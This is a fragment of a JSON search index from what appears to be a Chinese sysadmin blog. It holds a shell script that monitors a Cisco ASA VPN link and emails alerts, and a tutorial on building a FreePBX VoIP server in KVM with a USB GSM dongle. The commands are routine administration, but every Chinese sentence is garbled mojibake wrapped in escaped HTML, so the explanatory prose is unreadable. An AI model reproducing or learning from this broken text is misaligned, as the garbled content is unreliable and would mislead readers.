class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003ebody -msg \u003cspan class=\"s1\"\u003e\u0026#39;hello world\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e126é‚®ç®±è¿™é‡Œçš„å¯†ç ç”¨çš„æ˜¯æˆæƒç  æˆæƒå¯†ç ï¼Œä¸æ˜¯é‚®ç®±å¯†ç \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¯´æ˜ä¸€ä¸‹åœºæ™¯ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e210.210.210.3æ˜¯å¯¹ç«¯Cisco vpnè®¾å¤‡çš„å…¬ç½‘IP\u003c/li\u003e\n\u003cli\u003e192.168.101.99æ˜¯å»ºç«‹äº†VPNåï¼Œå¯¹ç«¯æœåŠ¡å™¨çš„ç§ç½‘IPåœ°å€ï¼›\u003c/li\u003e\n\u003cli\u003e192.168.1.1æ˜¯å·±æ–¹Cisco ASA5520çš„ç§ç½‘åœ°å€ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e -eq \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edo\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003elive\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003eping -c4 \u003cspan class=\"s2\"\u003e\u0026#34;192.168.101.99\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003ewc -l\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"nv\"\u003e$live\u003c/span\u003e -eq \u003cspan class=\"m\"\u003e5\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        /usr/local/bin/mailsend-go -debug -to \u003cspan class=\"s2\"\u003e\u0026#34;ranrui.zhang@rendoumi.com\u0026#34;\u003c/span\u003e -from monit@ddky.com -ssl -port \u003cspan class=\"m\"\u003e465\u003c/span\u003e -smtp smtp.qiye.aliyun.com \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e             auth -user \u003cspan class=\"s2\"\u003e\u0026#34;monit@ddky.com\u0026#34;\u003c/span\u003e -pass \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e             -sub \u003cspan class=\"s2\"\u003e\u0026#34;vpnæ–­äº†\u0026#34;\u003c/span\u003e body -msg \u003cspan class=\"s2\"\u003e\u0026#34;`date +%Y`å¹´`date +%m`æœˆ`date +%d`æ—¥ vpnæ–­äº†ï¼ï¼ï¼\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e             -cs \u003cspan class=\"s2\"\u003e\u0026#34;utf-8\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        /usr/local/bin/revpn.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;`date +%Y`å¹´`date +%m`æœˆ`date +%d`æ—¥ `date +%H`ç‚¹`date +%M`åˆ†\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                çº¿è·¯ä¸èƒ½åˆ°è¾¾ç‹åºœäº•æœºæˆ¿ï¼Œé‡å¯VPNã€‚\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        sleep \u003cspan class=\"m\"\u003e60\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efi\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    sleep \u003cspan class=\"m\"\u003e60\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edone\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä»¥ä¸‹æ˜¯ç”¨expectè‡ªåŠ¨ç™»å½•Ciscoè·¯ç”±å™¨é‡å¯vpnçš„è„šæœ¬ revpn.sh\u003c/p\u003e","title":"Cisco ASA5520 VPNçº¿è·¯çš„ç›‘æ§å’Œè‡ªåŠ¨é‡å¯"},{"content":"æ–°çš„ä¸€å¹´ä¾å§‹ï¼Œå¼€å§‹å®šå¥½äº†æ—…è¡Œè®¡åˆ’ï¼Œä½†æ˜¯æœ‰ä¸ªä¸œè¥¿å´ä¾ç„¶å¿ƒç¥ä¸å®ã€‚\né‚£å°±æ˜¯ä¸‡ä¸€åœ¨å›½å¤–æœ‰ä»€ä¹ˆå˜åŠ¨ï¼Œå¦‚ä½•å¾€å›½å†…æ‰“ç”µè¯å‘¢ï¼Ÿï¼\nè¯´åˆ°è¿™é‡Œï¼Œä¸å¾—ä¸æä¸ªä¸œè¥¿ï¼Œé‚£å°±æ˜¯æ—…é¡ºçš„Appï¼Œè¿™ä¸ªä¸œè¥¿å·²ç»æ¶ˆå¤±äº†ï¼Œä½†æ˜¯ç»å¯¹å€¼å¾—è¢«è®°ä½å•Šã€‚\nè¿™ä¸ªä¸œè¥¿åœ¨å¡ç­å²›æ—…æ¸¸çš„æ—¶å€™æ›¾ç»æ•‘äº†è‡ªå·±ä¸¤æ¬¡\né¦–å…ˆæ˜¯å®ƒçš„ç¬¬ä¸€ä»£äº§å“ï¼š\nç¬¬ä¸€ä»£çš„åŸç†ä¼¼ä¹æ˜¯æŠŠæ‰‹æœºçš„ä¿¡å·ç›´æ¥é€šè¿‡ç½‘ç»œè½¬ç§»åˆ°äº†å›½å†…ï¼Œéšèº«æºå¸¦ç„¶åé…åˆappä½¿ç”¨ï¼Œè¿™ç‚¹éå¸¸ç‰›å§ï¼å›½å†…çš„çªœå‡ºç‚¹ä¼šéšæœºï¼Œå¿½è€Œå¤©æ´¥ï¼Œå¿½è€Œåˆ«çš„åœ°æ–¹ï¼Œæ‰€ä»¥å‘¼å‡ºç”µè¯æä¸å¥½æ˜¯é•¿é€”è®¡è´¹ã€‚ç¬¬ä¸€æ¬¡å‘¢å…«æˆ’æ˜¯åœ¨å¡ç­å²›ä¸­éƒ¨é‚£ä¸ªéº¦å½“åŠ³é™„è¿‘ï¼Œç”¨è¿™ä¸ªæ¥åˆ°äº†å›½å†…çš„ç”µè¯ï¼Œè¯´æ˜¯å‡ºå¤§äº‹äº†ï¼Œæœ‰äººæŠŠå…¬å¸æ•°æ®åº“çš„æ•°æ®ç»™æ”¹äº†ï¼Œå½“æ—¶çº¦å®šä¸‹åˆ6ï¼š00å†æ‰“ï¼Œç„¶åä¸‹åˆåœ¨å°æ¹¾ç‰›è‚‰é¢çš„åº—é‡Œï¼Œåˆç”¨è¿™ä¸ªå¾€å›½å†…é€šäº†ç”µè¯ï¼Œæ‰“äº†åŠä¸ªå¤šå°æ—¶ï¼Œé¢†å¯¼å‘ŠçŸ¥äº†å…·ä½“çš„æƒ…å†µï¼Œè¦æ˜¯æ¥ä¸èµ·æ¥é‚£å¯çœŸå°±éº»çƒ¦å¤§äº†ã€‚\nè¿™ä¸ªæ˜¯å®ƒç¬¬äºŒä»£çš„äº§å“ï¼š\nè¿™ä¸ªæ˜¯å‡çº§ç‰ˆproï¼Œå°±æ›´å‰å®³äº†ï¼Œç›´æ¥æ”¾å®¶é‡Œï¼Œæ‰‹æœºä¸Šä¸‹ä¸ªappï¼Œæœ‰ç½‘ç»œå°±èƒ½ç”¨äº†ï¼Œä¸ç”¨åƒç¬¬ä¸€ä»£ä¸€æ ·éšèº«æºå¸¦äº†ã€‚\nè¿™ä¸ªæ›´æ˜¯æ•‘å‘½äº†ï¼Œè¯è¯´ç¬¬äºŒå›åœ¨å¡ç­çš„æ—¶å€™æ­£æ˜¯ç–«æƒ…åˆšå‘ä½œçš„æ—¶å€™ï¼Œå¡ç­ç›´æ¥å°å²›äº†ï¼Œç„¶åå¥½å¤šèˆªç­éƒ½å»¶æœŸæˆ–ç»ˆæ­¢äº†ï¼Œå°±æ˜¯ç”¨è¿™ä¸ªæ—…é¡ºæ‰“å›½å†…ç”µè¯æ”¹ç­¾äº†å›å›½çš„æœºç¥¨ï¼Œè¶³è¶³æ‰“äº†ä¸¤ä¸ªå°æ—¶å•Šï¼Œåˆ°å¤„å çº¿ç­‰å¾…ï¼Œå¦‚æœæ‰“å›½é™…é•¿é€”çš„è¯è´¹ç”¨ä¸å ªè®¾æƒ³ï¼Œå¦å¤–æ‰“å¡ç­å¤§éŸ©èˆªç©ºçš„ç”µè¯æ”¹ç­¾ä¸¤ç¨‹æœºç¥¨ä¹Ÿæ˜¯ä¸å¯æƒ³åƒçš„ï¼Œæ‰€ä»¥ï¼Œå…³é”®æ—¶åˆ»æ˜¯çœŸçš„æ•‘å‘½å•Šã€‚\nè¿™ä¹ˆå¥½çš„è½¯ä»¶å´ç›´æ¥å€’é—­æ¶ˆå¤±äº†ï¼ŒçœŸæ˜¯ä¸‡åˆ†å¯æƒœå•Šã€‚\nå“ï¼Œç°åœ¨æ²¡æœ‰è¿™ä¸ªäº†ï¼Œåªèƒ½è‡ªå·±æ­ä¸€ä¸ªvoipç”µè¯è‡ªç”¨äº†ã€‚\nåˆšå¼€å§‹æ˜¯è€ƒè™‘RasPBXï¼Œå…¶å®è‡ªå·±ç”¨æ ‘è“æ´¾æ­è¿‡ï¼Œè´¹äº‹ä¸è¯´ï¼Œä¸»è¦æ ‘è“æ´¾å®¹æ˜“æ­»æœºï¼ŒåŠ¡å¿…è¦ç¨³å®šï¼Œæ‰€ä»¥å¹²è„†ç”¨FreePBXæ­å»ºåœ¨kvmæœåŠ¡å™¨è™šæ‹Ÿæœºä¸Šçš„æ–¹å¼ï¼Œæ¥ä¿æŒç»å¯¹ç¨³å®šã€‚\nä»¥ä¸‹æ•™ç¨‹åªé€‚ç”¨äº FreePBX 16 çš„å®˜æ–¹ISOï¼Œå…·ä½“åšæ³•å¦‚ä¸‹ï¼š\nä¸€ã€å®‰è£…KVMè™šæœºï¼š #ä¸‹è½½FreePBX16çš„isoå…‰ç›˜ wget https://downloads.freepbxdistro.org/ISO/SNG7-PBX16-64bit-2302-1.iso #åˆ›å»ºqcow2è™šæœºæ–‡ä»¶ qemu-img create -f qcow2 freepbx-8-2-60/freepbx-8-2-60.qcow2 20G virt-install \\ --name=freepbx-8-2-60 \\ --vcpu=4 \\ --ram=8096 \\ --disk path=/export/kvm/freepbx-8-2-60/freepbs-8-2-60.qcow2,format=qcow2,size=20 \\ --cdrom=/export/kvm/SNG7-PBX16-64bit-2302-1.iso \\ --network bridge=br0 \\ --os-type=linux \\ --vnc --vnclisten=0.0.0.0 --vncport=5916 ç”¨vncè¿æ¥5916ç«¯å£å®‰è£…ï¼Œè®¾ç½®ä¸€ä¸‹rootçš„å¯†ç å®‰è£…ã€‚\nè¿™æ ·å®‰è£…å¥½åï¼Œç³»ç»Ÿå…¶å®æ˜¯dhcpåŠ¨æ€è·å¾—ipçš„ï¼Œè¿›å…¥çœ‹äº†çœ‹ï¼Œæ˜¯Centosï¼Œæˆ‘ä»¬ä¸éœ€è¦dhcpï¼ŒæŠŠIPç»™å›ºå®šæ­»\nvi /etc/sysconfig/network-scripts/ifcfg-eth0 TYPE=\u0026#34;Ethernet\u0026#34; BOOTPROTO=\u0026#34;static\u0026#34; IPADDR=10.8.2.60 NETMASK=255.255.255.0 GATEWAY=10.8.2.1 DNS1=114.114.114.114 DEFROUTE=\u0026#34;yes\u0026#34; NAME=\u0026#34;eth0\u0026#34; DEVICE=\u0026#34;eth0\u0026#34; ONBOOT=\u0026#34;yes\u0026#34; SSHç™»å½•ä¸€ä¸‹æ²¡é—®é¢˜ï¼Œçœ‹åˆ°ç»¿æ¡†å°±okäº†\näºŒã€é…ç½®FreePBXçš„åˆ†æœº æ‰“å¼€ç½‘å€ http://10.8.2.60 , ç™»å½• FreePBX Administration\nç™»ä¸Šå»åæ˜¯è¿™ä¸ªæ ·å­\nä¸Šé¢æˆ‘æ²¡æœ‰å¼€System Firewallï¼Œè¿™ä¸ªçœ‹ä¸ªäººéœ€æ±‚ï¼Œç»å¯¹ä¸è¦åƒå…¬ç½‘å¼€æ”¾80ç«¯å£ï¼Œåªå¼€5060çš„udpå’Œ1000-10004çš„UDPã€‚\nå¼€äº†å…¬ç½‘80çš„è¯ï¼Œé‚£å°±æ˜¯å¦å¤–ä¸€ä¸ªæ‚²ä¼¤çš„æ•…äº‹äº†ï¼ï¼ï¼\nç„¶åå»ºç«‹ç¬¬ä¸€ä¸ªåˆ†æœº888ï¼š\nç›´æ¥åœ¨Applications-\u0026gt;Extensions-\u0026gt;Add new Chan_SIP Extensionæ–°å»ºä¸€ä¸ªåˆ†æœºï¼Œåœ¨Generaltabé¡µé‡Œé¢å¡«å¥½ç¬¬ä¸€ä¸ªSIPè´¦æˆ·çš„ä¿¡æ¯\nGeneralå¡«å†™:\nUser Extension åˆ†æœºå·ä¸º888 Display Name ä¸º ba jieï¼Œæœ€å¥½è‡ªå·±åå­—ï¼Œå¥½åŒºåˆ† Secret æ˜¯å¯†ç ï¼Œè¦å¡«å†™ä¸ªéå¸¸å¤æ‚çš„ï¼Œç»å¯¹ä¸èƒ½ç®€å•ã€‚ ç„¶åæœ€åº•ä¸‹ï¼ŒSubmit æäº¤ä¸€ä¸‹\næœ€åç‚¹å‡»å³ä¸Šè§’çš„Apply Configåº”ç”¨åˆšæ‰çš„é…ç½®ã€‚\nä¸‰ã€é…ç½®dongleæ— çº¿å¡ å†…éƒ¨åˆ†æœºæœ‰äº†ï¼Œæˆ‘ä»¬éœ€è¦é…ç½®å¤–éƒ¨çº¿è·¯\nå»æ·˜å®ä¸Šä¹°ä¸ªdongleå¡ï¼Œæ’åˆ°æœåŠ¡å™¨ä¸Š\nç™»å½•æœåŠ¡å™¨ï¼Œlsusb æŸ¥çœ‹ä¸€ä¸‹usbçš„åœ°å€\nå¾—åˆ° vendori d: 12d1 å’Œ product id: 1436 è¿™ä¸¤ä¸ªå­—ä¸²ï¼Œç¼–è¾‘ä¸€ä¸ªæ–‡ä»¶ usb-attach.xml æ–‡ä»¶ï¼š\nvi usb-attach.xml \u0026lt;hostdev mode=\u0026#39;subsystem\u0026#39; type=\u0026#39;usb\u0026#39;\u0026gt; \u0026lt;source\u0026gt; \u0026lt;vendor id=\u0026#39;0x12d1\u0026#39;/\u0026gt; \u0026lt;product id=\u0026#39;0x1436\u0026#39;/\u0026gt; \u0026lt;/source\u0026gt; \u0026lt;/hostdev\u0026gt; ç„¶åæŒ‚æ¥ä¸Š\nvirsh attach-device freepbx-8-2-60 --file usb_huawei.xml --persistent sshç™»å½•è¿›å…¥freepbxï¼ŒlsusbæŸ¥çœ‹ä¸€ä¸‹ï¼ŒåŒæ ·èƒ½çœ‹åˆ°å°±å¯¹äº†\nç„¶åå°±æ˜¯å¤§å·¥ç¨‹äº†ï¼Œç¼–è¯‘é©±åŠ¨ç¨‹åºï¼Œéå¸¸çš„å¤æ‚\nä¸æƒ³ç¼–è¯‘çš„åŠæ³•ï¼š\n# è§£å‹åŒ… unzip -x dongle.zip cp chan_dongle.so /usr/lib64/asterisk/modules chmod 644 /usr/lib64/asterisk/modules/chan_dongle.so å®Œæ•´çš„ç¼–è¯‘çš„æ–¹æ³•ï¼š\n#è§£å‹åŒ… unzip asterisk-chan-dongle-master* #å®‰è£…å‡†å¤‡åŒ…ç¼–è¯‘ yum install automake autotools-dev autoconf yum -y install tcl asterisk18-devel make automake binutils #ç¼–è¯‘å®‰è£… cd asterisk-chan-dongle-master/ autoupdate aclocal autoconf automake -a ./bootstrap ./configure --with-astversion=18.19.0 make clean make make install cd /usr/lib64/asterisk/modules ls -lcat|more çœ‹åˆ°æœ‰dongleå­—æ ·å°±okäº†\næ²¡å®Œå‘¢å•Šï¼Œè¿˜éœ€è¦æŠŠé…ç½®æ–‡ä»¶éƒ½å¼„è¿›å»\n#è§£å‹ unzip -x dongle.zip #install dongles driver cd echo \u0026#39;KERNEL==\u0026#34;ttyUSB*\u0026#34;, MODE=\u0026#34;0666\u0026#34;, OWNER=\u0026#34;asterisk\u0026#34;, GROUP=\u0026#34;uucp\u0026#34;\u0026#39;\u0026gt;/etc/udev/rules.d/92-dongle.rules echo \u0026#39;rungroup = dialout\u0026#39;\u0026gt;\u0026gt;/etc/asterisk/asterisk.conf mv dongle.conf /etc/asterisk/dongle.conf chown asterisk.asterisk /etc/asterisk/dongle.conf chmod 664 /etc/asterisk/dongle.conf mv extensions_custom.conf /etc/asterisk/extensions_custom.conf chown asterisk.asterisk /etc/asterisk/extensions_custom.conf chmod 664 /etc/asterisk/extensions_custom.conf ä¸‹è½½åœ°å€ï¼šdongle.zip\nç„¶åæŠŠè™šæœºrebootä¸€ä¸‹ï¼Œè¿›å…¥asteriskæŸ¥çœ‹\nasterisk -rvvv dongle show devices çœ‹åˆ°è‡ªå·±dongleè®¾å¤‡çš„idï¼Œæ˜¯dongle1ï¼Œè®°ä¸‹æ¥ï¼Œå°±ok\nå››ã€é…ç½®FreePBXçš„è¿›å‡ºçº¿è·¯ 1ã€å¢åŠ trunk å›åˆ° FreePBX çš„é…ç½®ç•Œé¢ï¼Œå…ˆé…ä¸€ä¸‹ Trunk çº¿è·¯ï¼Œå¢åŠ ä¸€ä¸ªtrunk:connectivity-\u0026gt;Trunks\nå¢åŠ ä¸€ä¸ª Custom Trunk:\nGeneralå¡«å†™ï¼š\nTrunk Name : china_unicom Outbound CallerID: ç©º ï¼ˆè”é€šæ‰‹æœºå·ï¼Œæœ€å¥½ç©ºï¼Œåé¢æœ‰æç¤ºå¿½ç•¥ï¼Œè¿™ä¸ªæ¥æ‰“çš„æ—¶å€™ä¼šè‡ªåŠ¨æ›¿ä½ å¡«ä¸Šçš„ï¼‰ Maximum Channels: 1 (åªæœ‰ä¸€ä¸ªè”é€šsimå¡ï¼Œå°±æ˜¯1ï¼Œ2ä¸ªå°±æ˜¯2) ç„¶åç‚¹åˆ°custom Settingsï¼Œå¡«å…¥å¦‚ä¸‹å†…å®¹ï¼Œæ³¨æ„ï¼Œæˆ‘çš„è®¾å¤‡æ˜¯dongle1ï¼ŒæŒ‰æŸ¥å‡ºæ¥çš„è®¾å¤‡å¡«å†™å•Šã€‚\ndongle/dongle1/$OUTNUM$ ç„¶ååŒæ · Submitï¼Œ ç„¶å Apply config. ä¼šæç¤ºCallerIDï¼Œokå¿½ç•¥å³å¯ã€‚\n2ã€é…ç½®æ‹¨å…¥çº¿è·¯Inbound route connectivity-\u0026gt;Inbound Routes\nå¢åŠ ä¸€ä¸ªæ–°çš„Inboundï¼Œåå­—å°±å«gsm_inï¼Œå¯ä»¥éšä¾¿æ”¹ã€‚DIDå’ŒCallerIDéƒ½æ˜¯ANYï¼Œæ„å‘³ç€æ‰€æœ‰è¾¾åˆ°è¿™ä¸ªsimå¡å†…çš„ç”µè¯éƒ½æ¥ä¸‹æ¥ï¼ŒDestinationé€‰æ‹©å’±ä»¬ä¸€å¼€å§‹çš„888åˆ†æœºï¼Œè¿™æ ·å‘¼å…¥çš„ç”µè¯å°±å¯ä»¥è¢«888åˆ†æœºæ¥å¬äº†\nDescription: gsm_in DID Number: ANY CallerID Number: ANY Set Destination: Extensions â€‹ 888 zhang ranrui æœ€ååŒæ · Submit , Apply Configé…ç½®ç”Ÿæ•ˆ\n3ã€é…ç½®æ‹¨å‡ºçº¿è·¯Outbound Routes connectivity-\u0026gt;Outbound Routes\nå¢åŠ ä¸€æ¡æ–°çš„æ‹¨å‡ºçº¿è·¯ï¼Œåå­—å«gsm_outå¥½äº†ï¼Œå¯ä»¥éšä¾¿æ”¹ï¼ŒTrunké€‰å’±ä»¬å»ºç«‹çš„ china_unicom\nRoute Name : gsm_out\nTrunk Sequence for Matched Routes: china_unicom\næ³¨æ„ï¼Œç‚¹åˆ°æ‹¨å·ç›˜ï¼Œè¿˜éœ€è¦é…ä¸€ä¸‹ Dail Patterns\nMatch Pattern: ZX. ZX. çš„æ„æ€æ˜¯æ‹¨å‡ºå»çš„å·ç æœ€å°‘æœ‰3ä¸ªæ•°å­—é‚£ä¹ˆé•¿ï¼Œä¸”ç¬¬ä¸€ä½ä¸æ˜¯0ï¼Œé‚£æ‰‹æœº11ä½ï¼Œèµ·å§‹æ˜¯1å°±æ»¡è¶³äº†ã€‚å¾ˆå¤šæ•™ç¨‹æ•™é…ä¸ª1å’Œ9ä»€ä¹ˆçš„ï¼Œæœ‰æ¯›ç—…å•Šï¼Œæ‹¨å‡ºå»è¿˜è¦åŠ æ‹¨1å’Œ9\næœ€åä»ç„¶æ˜¯Submitï¼ŒApply Configé…ç½®ç”Ÿæ•ˆã€‚\nè¿™æ ·åŸºæœ¬ä¸Šå°±å®Œå·¥äº†\näº”ã€é…ç½®æ‰‹æœºç«¯voipè½¯ä»¶ ç½‘ä¸Šå¤§å¤šæ•°çš„æ•™ç¨‹éƒ½æ˜¯ç”¨zoiperï¼Œè¿™é‡Œå¼ºçƒˆæŒ‡å‡ºï¼Œè¿™ä¸ªè½¯ä»¶æ ¹æœ¬ä¸è¡Œï¼ï¼ï¼\nä¸€æ˜¯zoiperå¿…é¡»è¿è¡Œåœ¨å‰å°æ‰èƒ½æ¥èµ·æ¥æ‰“åˆ°dongleé‡Œçš„ç”µè¯ï¼ŒäºŒæ˜¯zoiperé‡Œgsmå¥½çš„éŸ³é¢‘ç¼–ç å±…ç„¶æ˜¯æ”¶è´¹çš„ã€‚\nç½‘ä¸Šæœäº†åŠå¤©ï¼Œç»ˆäºæ‰¾åˆ°äº†ä¸ªå¥½çš„ï¼ŒPortSIPï¼Œiphoneä¸‹ä¹Ÿæ˜¯å¿…é¡»ç”¨å¤–åŒºidæ‰èƒ½æœåˆ°å¹¶ä¸‹è½½å®‰è£…ã€‚\nè¿™ä¸ªè½¯ä»¶å…¶å®æ˜¯ä¸€å®¶æä¾›pbxæœåŠ¡çš„å…¬å¸æä¾›çš„å®¢æˆ·ç«¯ï¼Œå¯ä»¥æ¥èµ·æ¥æ‰“åˆ°asteriskæ‰‹æœºå¡é‡Œçš„æ‰‹æœºï¼Œè€Œä¸”éŸ³é¢‘ç¼–ç g.729ç­‰ç­‰éƒ½æ˜¯å…è´¹çš„ã€‚\né‚£å¿…é¡»èµä¸€ä¸ªã€‚é«˜çº§è®¾ç½®é‡Œå¼ºåˆ¶å’Œé›†æˆå°±æ˜¯æ¥èµ·æ¥çš„ä¿è¯ï¼Œä¸è¿‡ä¼šå¤§é¢ç§¯è€—ç”µã€‚\néŸ³é¢‘ç¼–ç å™¨ä¸­g.729ä¹Ÿæ˜¯å…è´¹çš„ã€‚æ¯”zoiperè¿˜æ”¶ä½ é’±åšé“å¤šäº†ã€‚\nè®¾ç½®ä¹ŸåŠå…¶ç®€å•ï¼š\nåŸŸåå’Œå‡ºç«™ä»£ç†éƒ½å†™Freepbxæš´éœ²å‡ºå»çš„å…¬ç½‘ipå³å¯\nç”¨æˆ·åå°±æ˜¯pbxæ·»åŠ çš„é‚£ä¸ªåˆ†æœº888ï¼Œå¯†ç å°±æ˜¯secretã€‚\nå…«æˆ’äº²è‡ªåœ¨æ³°å›½æ™®å‰æµ‹è¯•äº†å¾ˆå¤šæ¬¡ï¼Œå®Œèƒœzoiperï¼Œå¼ºçƒˆæ¨èå•Šã€‚\nå…­ã€è·¯ç”±å™¨è®¾ç½® æœ‰å…¬ç½‘è®¾ç½®ï¼Œéœ€è¦åšç«¯å£æ˜ å°„\nè·¯ç”±å™¨Port 5060 udp --\u0026gt; FreePBX Port 5060 udp è·¯ç”±å™¨Port 10000-\u0026gt;10004 udp --\u0026gt; FreePBX Port 10000-10004 udp 10000åˆ°10004çš„ç«¯å£æ˜ å°„å‡ºå»æ˜¯å› ä¸ºè¯­éŸ³ä¸€è·¯ï¼Œæ•°æ®ä¸€è·¯ï¼Œæˆ‘ä»¬åªæœ‰ä¸€ä¸ªsimå¡ï¼Œ4è·¯è¶³å¤Ÿäº†ã€‚\nä¸ƒã€è¡¥å…… åœ¨freepbxä¸Šé¢å‘é€çŸ­ä¿¡çš„å‘½ä»¤\nasterisk -rx \u0026#34;dongle sms dongle1 +8613000000000 ä¿¡æ¯æµ‹è¯•\u0026#34; ","permalink":"https://rendoumi.com/posts/20240105-voip_iphone/","summary":"\u003cp\u003eæ–°çš„ä¸€å¹´ä¾å§‹ï¼Œå¼€å§‹å®šå¥½äº†æ—…è¡Œè®¡åˆ’ï¼Œä½†æ˜¯æœ‰ä¸ªä¸œè¥¿å´ä¾ç„¶å¿ƒç¥ä¸å®ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£å°±æ˜¯ä¸‡ä¸€åœ¨å›½å¤–æœ‰ä»€ä¹ˆå˜åŠ¨ï¼Œå¦‚ä½•å¾€å›½å†…æ‰“ç”µè¯å‘¢ï¼Ÿï¼\u003c/p\u003e\n\u003cp\u003eè¯´åˆ°è¿™é‡Œï¼Œä¸å¾—ä¸æä¸ªä¸œè¥¿ï¼Œé‚£å°±æ˜¯æ—…é¡ºçš„Appï¼Œè¿™ä¸ªä¸œè¥¿å·²ç»æ¶ˆå¤±äº†ï¼Œä½†æ˜¯ç»å¯¹å€¼å¾—è¢«è®°ä½å•Šã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªä¸œè¥¿åœ¨å¡ç­å²›æ—…æ¸¸çš„æ—¶å€™æ›¾ç»æ•‘äº†è‡ªå·±ä¸¤æ¬¡\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæ˜¯å®ƒçš„ç¬¬ä¸€ä»£äº§å“ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240105135104823\" loading=\"lazy\" 